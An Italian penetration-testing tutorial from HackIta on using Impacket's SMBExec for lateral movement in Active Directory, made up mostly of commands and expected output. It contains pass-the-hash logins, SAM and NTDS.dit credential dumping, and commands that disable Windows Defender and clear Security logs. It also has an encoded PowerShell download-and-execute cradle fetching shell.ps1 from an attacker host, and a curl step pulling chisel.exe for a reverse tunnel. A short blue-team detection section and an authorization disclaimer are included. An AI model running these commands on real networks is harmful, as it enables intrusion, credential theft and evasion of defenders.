---
title: 'SMBExec: Esecuzione Remota Fileless su Windows via SMB'
slug: smbexec
description: >-
  SMBExec è una tecnica di remote command execution su SMB 445 senza drop di
  binari persistenti. Alternativa più stealth a PsExec in ambienti Active
  Directory.
image: /Gemini_Generated_Image_m9xvwym9xvwym9xv.webp
draft: false
date: 2026-02-25T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - ad
  - smb
---

SMBExec è una tecnica di esecuzione comandi remota che sfrutta il Service Control Manager di Windows attraverso SMB, senza scrivere eseguibili sul disco del target. Parte della suite Impacket, rappresenta l'alternativa stealth a PsExec quando hai credenziali valide e vuoi minimizzare gli artefatti forensi. In questa guida impari a usare SMBExec per lateral movement in ambienti Active Directory, dalla connessione iniziale alla post-exploitation completa.

## Posizione nella Kill Chain

SMBExec si colloca nella fase di lateral movement, dopo aver ottenuto credenziali valide tramite tecniche come credential harvesting con [Mimikatz](https://hackita.it/articoli/mimikatz), password spraying con [Hydra](https://hackita.it/articoli/hydra), o hash dumping. L'output di SMBExec alimenta direttamente la fase successiva: privilege escalation locale, credential dumping aggiuntivo, o persistenza.

| Fase Kill Chain   | Tool Precedente      | SMBExec                   | Tool Successivo     |
| ----------------- | -------------------- | ------------------------- | ------------------- |
| Credential Access | Mimikatz, Responder  | → Validazione credenziali | → Post-exploitation |
| Lateral Movement  | BloodHound (path)    | → Esecuzione remota       | → WinPEAS, Seatbelt |
| Execution         | CrackMapExec (check) | → Shell interattiva       | → Persistenza       |

## Installazione e Setup

SMBExec fa parte di Impacket. Su Kali Linux è preinstallato:

```bash
smbexec.py --help
```

Per installazione manuale con ultima versione:

```bash
git clone https://github.com/fortra/impacket.git /opt/impacket
cd /opt/impacket
pip3 install .
```

Verifica il funzionamento:

```bash
smbexec.py -h
```

Output atteso:

```
Impacket v0.11.0 - Copyright 2023 Fortra

usage: smbexec.py [-h] [-share SHARE] [-mode {SHARE,SERVER}] ...
```

### Requisiti

* Credenziali valide (password o hash NTLM)
* Porta 445 raggiungibile sul target
* Privilegi amministrativi locali sul target
* Servizio Server attivo (default su Windows)

## Uso Base

La sintassi segue il formato standard Impacket: `DOMAIN/user:password@target`

### Autenticazione con Password

```bash
smbexec.py CORP/administrator:Password123@192.168.1.100
```

Output di connessione riuscita:

```
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell -, type help for other options
C:\Windows\system32>
```

### Autenticazione Pass-the-Hash

Quando hai solo l'hash NTLM (scenario comune dopo credential dumping):

```bash
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
```

Il formato hash è `LMHASH:NTHASH`. Se non hai LM hash, usa quello vuoto: `aad3b435b51404eeaad3b435b51404ee`.

### Autenticazione Kerberos

Per ambienti con NTLM disabilitato:

```bash
smbexec.py -k -no-pass CORP/administrator@dc01.corp.local
```

Richiede un TGT valido nella cache (`KRB5CCNAME` environment variable) ottenuto con [Rubeus](https://hackita.it/articoli/rubeus) o getTGT.py.

## Come Funziona Internamente

Capire il meccanismo interno aiuta nel troubleshooting e nell'evasion:

1. **Connessione SMB** - Autentica al target via SMB sulla porta 445
2. **Accesso SCM** - Si connette al Service Control Manager remoto
3. **Creazione Servizio** - Crea un servizio temporaneo con nome random
4. **Esecuzione Comando** - Il servizio esegue `cmd.exe /Q /c [comando] > \\127.0.0.1\share\output 2>&1`
5. **Recupero Output** - Legge l'output dalla share
6. **Cleanup** - Elimina il servizio

Nessun file eseguibile viene mai scritto sul disco, solo comandi passati a cmd.exe nativo.

## Tecniche di Lateral Movement

### Enumerazione Post-Accesso

Una volta connesso, enumera l'ambiente:

```
C:\Windows\system32> whoami /all
C:\Windows\system32> net user /domain
C:\Windows\system32> net group "Domain Admins" /domain
C:\Windows\system32> ipconfig /all
C:\Windows\system32> netstat -ano
```

### Credential Dumping Remoto

Estrai credenziali per ulteriore lateral movement:

```
C:\Windows\system32> reg save HKLM\SAM C:\Windows\Temp\sam
C:\Windows\system32> reg save HKLM\SYSTEM C:\Windows\Temp\sys
```

Poi scarica i file e processali offline con secretsdump.py.

Alternativa diretta con secretsdump dalla stessa suite [Impacket](https://hackita.it/articoli/impacket):

```bash
secretsdump.py CORP/administrator:Password123@192.168.1.100
```

### Disabilitare Difese

Se necessario per persistenza:

```
C:\Windows\system32> powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
C:\Windows\system32> sc stop WinDefend
```

## Defense Evasion

### Tecnica 1: Service Name Custom

Il nome servizio di default è randomico, pattern riconoscibile. Usa un nome legittimo:

```bash
smbexec.py -service-name "WinRM" CORP/admin:pass@192.168.1.100
```

Nomi che si mimetizzano: `WinRM`, `BITS`, `wuauserv`, `TrustedInstaller`.

### Tecnica 2: Timestomping Commands

Dopo l'esecuzione, il comando appare nei log. Minimizza il footprint usando comandi brevi e concatenati:

```
C:\> cmd /c "whoami && hostname && ipconfig" > C:\Windows\Temp\o.txt
```

### Tecnica 3: Alternative Execution via PowerShell

Per ridurre artefatti cmd.exe, passa a PowerShell encodato:

```bash
# Genera comando encodato
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.50/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0
```

Esegui via SMBExec:

```
C:\> powershell -enc <BASE64_STRING>
```

## Scenari Pratici di Penetration Test

### Scenario 1: Lateral Movement da Workstation Compromessa

**Timeline stimata: 15 minuti**

Situazione: hai compromesso una workstation con [Metasploit](https://hackita.it/articoli/metasploit-framework) e dumpato hash locali.

```bash
# COMANDO: Dump hash dalla sessione Meterpreter
meterpreter > hashdump
Administrator:500:aad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# COMANDO: Identifica altri host dove l'admin locale è valido
crackmapexec smb 192.168.1.0/24 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42 --local-auth
```

## OUTPUT ATTESO

```
SMB  192.168.1.100  445  WS01  [+] WS01\Administrator e19ccf75ee54e06b06a5907af13cef42 (Pwn3d!)
SMB  192.168.1.105  445  WS02  [+] WS02\Administrator e19ccf75ee54e06b06a5907af13cef42 (Pwn3d!)
```

```bash
# COMANDO: Connessione a secondo target
smbexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 ./Administrator@192.168.1.105
```

### COSA FARE SE FALLISCE

* **"STATUS\_LOGON\_FAILURE"**: Hash non valido su quel target. Prova su altri host.
* **"STATUS\_ACCESS\_DENIED"**: L'utente non è admin locale. Cerca altri hash.
* **Timeout**: Firewall blocca 445. Verifica con `nmap -p 445 target`.

### Scenario 2: Domain Admin a Domain Controller

**Timeline stimata: 5 minuti**

Hai credenziali Domain Admin da phishing con [SET](https://hackita.it/articoli/set).

```bash
# COMANDO: Connessione diretta al DC
smbexec.py CORP/domainadmin:Str0ngP@ss!@dc01.corp.local
```

## OUTPUT ATTESO

```
C:\Windows\system32> whoami
corp\domainadmin

C:\Windows\system32> hostname
DC01
```

```bash
# COMANDO: Dump NTDS.dit per tutti gli hash del dominio
secretsdump.py CORP/domainadmin:Str0ngP@ss!@dc01.corp.local -just-dc-ntlm
```

### COSA FARE SE FALLISCE

* **"KDC\_ERR\_PREAUTH\_FAILED"**: Password errata o account lockout. Verifica credenziali.
* **"rpc\_s\_access\_denied"**: UAC remote restrictions. Prova con built-in Administrator.

### Scenario 3: Pivot Through Compromised Server

**Timeline stimata: 20 minuti**

Hai accesso a un server interno e devi raggiungere un segmento di rete isolato.

```bash
# COMANDO: Setup port forwarding con Chisel
# Sulla tua macchina
chisel server -p 8080 --reverse

# Sul server compromesso via SMBExec
C:\> curl http://192.168.1.50/chisel.exe -o C:\Windows\Temp\c.exe
C:\> C:\Windows\Temp\c.exe client 192.168.1.50:8080 R:1080:socks
```

Configura proxychains e usa SMBExec attraverso il tunnel:

```bash
proxychains smbexec.py CORP/admin:pass@10.10.10.50
```

## Integration Matrix

| SMBExec +                                                 | Risultato                     | Comando                                                 |
| --------------------------------------------------------- | ----------------------------- | ------------------------------------------------------- |
| [secretsdump.py](https://hackita.it/articoli/secretsdump) | Dump credenziali senza shell  | `secretsdump.py user:pass@target`                       |
| [BloodHound](https://hackita.it/articoli/bloodhound)      | Visualizza path di attacco    | Identifica target → SMBExec per accesso                 |
| [CrackMapExec](https://hackita.it/articoli/crackmapexec)  | Validazione credenziali massa | `cme smb range -u user -p pass` → SMBExec su "(Pwn3d!)" |
| [Chisel](https://hackita.it/articoli/chisel)              | Pivot in reti isolate         | Tunnel SOCKS → proxychains + SMBExec                    |

## Confronto con Alternative

| Caratteristica | SMBExec     | [PsExec](https://hackita.it/articoli/psxec) | [WMIExec](https://hackita.it/articoli/wmiexec) | [AtExec](https://hackita.it/articoli/atexec) |
| -------------- | ----------- | ------------------------------------------- | ---------------------------------------------- | -------------------------------------------- |
| File su disco  | No          | Sì (.exe)                                   | No                                             | No                                           |
| Meccanismo     | SCM + cmd   | SCM + binario                               | WMI                                            | Task Scheduler                               |
| Velocità       | Media       | Alta                                        | Media                                          | Bassa                                        |
| Stealth        | Alto        | Basso                                       | Molto Alto                                     | Alto                                         |
| Richiede       | Admin + 445 | Admin + 445                                 | Admin + 135                                    | Admin + 445                                  |
| Detection      | Medio       | Facile                                      | Difficile                                      | Difficile                                    |

**Quando usare SMBExec**: vuoi stealth moderato senza binari, 445 aperta, WMI potrebbe essere monitorato.

**Quando evitare**: target con EDR avanzato che monitora creazione servizi, o quando serve velocità.

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* **Event ID 7045** - Creazione servizio con nome random/insolito
* **Event ID 7036** - Start/stop servizi frequenti
* **Event ID 4688** - Process creation cmd.exe con redirect output
* **Connessioni SMB** - IPC$ access seguito da creazione servizio

### Evasion Techniques

1. **Service name blending** - Usa nomi servizi Windows legittimi
2. **Timing** - Esegui durante orari lavorativi quando il rumore è alto
3. **Command batching** - Minimizza numero esecuzioni concatenando comandi
4. **Log deletion** - `wevtutil cl Security` (se accettabile per l'engagement)

## Troubleshooting

### Errore: "STATUS\_ACCESS\_DENIED"

Causa più comune: l'utente non ha privilegi admin locali.

```bash
# Verifica con CrackMapExec
crackmapexec smb 192.168.1.100 -u user -p pass --local-auth
# Cerca "(Pwn3d!)" nell'output
```

Fix: trova un utente con privilegi amministrativi locali.

### Errore: "Connection refused"

SMB non raggiungibile.

```bash
# Verifica porta
nmap -p 445 192.168.1.100 -Pn
```

Fix: verifica firewall, prova da diverso punto di origine.

### Shell Lenta o Timeout

SMBExec può essere lento per comandi con molto output.

Fix: reindirizza output su file e scarica:

```
C:\> systeminfo > C:\Windows\Temp\info.txt
```

Poi recupera con `smbclient` o `download` se hai sessione Meterpreter parallela.

### Errore: "STATUS\_LOGON\_TYPE\_NOT\_GRANTED"

Policy di sicurezza impedisce logon network per quell'utente.

Fix: usa un utente diverso o prova WMIExec come alternativa.

## Cheat Sheet Comandi

| Operazione              | Comando                                              |
| ----------------------- | ---------------------------------------------------- |
| Connessione password    | `smbexec.py DOMAIN/user:pass@target`                 |
| Connessione PTH         | `smbexec.py -hashes :NTHASH user@target`             |
| Connessione Kerberos    | `smbexec.py -k -no-pass user@target`                 |
| Service name custom     | `smbexec.py -service-name NAME user:pass@target`     |
| Local admin (no domain) | `smbexec.py ./admin:pass@target`                     |
| PowerShell shell        | `smbexec.py -shell-type powershell user:pass@target` |
| Porta custom            | `smbexec.py -port 445 user:pass@target`              |

## FAQ

**SMBExec vs PsExec Impacket?**

SMBExec non scrive file su disco, quindi meno detection AV. PsExec è più stabile per sessioni lunghe. Usa SMBExec quando stealth è priorità.

**Funziona su Windows 11?**

Sì, a patto che il servizio Server sia attivo e tu abbia credenziali admin valide. Windows 11 non ha protezioni aggiuntive contro questa tecnica.

**Posso usare SMBExec attraverso VPN?**

Sì, se la VPN permette traffico sulla porta 445. Molte VPN aziendali la bloccano per sicurezza.

**Come gestisco UAC Remote Restrictions?**

Usa l'account Administrator built-in (RID 500) che bypassa UAC remote, oppure modifica la registry `LocalAccountTokenFilterPolicy`.

**SMBExec lascia tracce?**

Sì: eventi creazione servizio, connessioni SMB nei log, potenziali artefatti in memoria. Non è invisibile, solo più stealth di PsExec.

**È legale usare SMBExec?**

Solo su sistemi con autorizzazione scritta. Per penetration test Active Directory professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Impacket GitHub](https://github.com/fortra/impacket) | [Impacket Docs](https://www.secureauth.com/labs/open-source-tools/impacket/)
